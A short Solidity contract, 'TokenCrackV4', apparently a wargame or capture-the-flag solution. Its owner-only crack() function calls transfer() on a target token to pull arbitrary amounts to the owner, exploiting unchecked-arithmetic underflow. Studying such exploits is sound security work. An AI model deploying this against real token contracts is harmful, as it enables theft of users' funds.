// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
import "hardhat/console.sol";

interface TokenI {
    function totalSupply() external returns (uint256);

    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256);
}

contract TokenCrackV4 {
    address payable public owner;
    TokenI targetContractI;

    constructor(address targetContract) payable {
        owner = payable(msg.sender);
        targetContractI = TokenI(targetContract);
    }

    function crack(uint256 amount) public {
        require(msg.sender == owner, "You aren't the owner");
        console.log("Aca");
        targetContractI.transfer(owner, amount);
    }
}
